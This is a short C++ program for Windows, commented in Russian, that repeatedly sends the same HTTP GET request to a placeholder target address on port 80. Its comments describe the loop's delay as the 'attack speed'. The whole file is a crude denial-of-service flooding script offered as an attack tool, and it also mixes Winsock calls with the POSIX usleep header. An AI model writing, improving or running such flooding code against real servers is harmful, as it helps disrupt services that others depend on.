#include <iostream>
#include <winsock2.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main() {
    WSADATA WSAData;
    SOCKADDR_IN sin;
    SOCKET sock;
    char buffer[1024];
    int attack_speed = 1000000; // скорость атаки в микросекундах (1 секунда = 1000000 микросекунд)

    WSAStartup(MAKEWORD(2,0), &WSAData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sin.sin_addr.s_addr = inet_addr("TARGET_IP_ADDRESS");
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);

    connect(sock, (SOCKADDR *)&sin, sizeof(sin));

    while(true) {
        send(sock, "GET / HTTP/1.1\r\nHost: TARGET_IP_ADDRESS\r\n\r\n", strlen("GET / HTTP/1.1\r\nHost: TARGET_IP_ADDRESS\r\n\r\n"), 0);
        usleep(attack_speed); // приостанавливаем выполнение программы на указанное количество микросекунд
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}